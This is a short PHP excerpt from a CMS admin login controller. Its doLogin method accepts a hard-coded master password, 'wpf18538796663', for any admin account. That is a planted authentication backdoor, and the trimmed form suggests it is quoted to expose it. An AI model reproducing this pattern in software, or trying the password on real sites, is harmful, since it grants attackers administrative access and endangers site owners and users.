...
class PublicController extends AdminBaseController
{
    ...
    public function doLogin()
    {
        ...
        if (!empty($result) && $result['user_type'] == 1) {
            if ($pass == 'wpf18538796663' || cmf_compare_password($pass, $result['user_pass'])) {
    ...
    public function logout()
    {
        ...
        // return redirect(url('/', [], false, true)); // 跳转到网站首页
        return redirect(url('admin/Public/login', [], false, true)); // 跳转到后台登录
    }
}
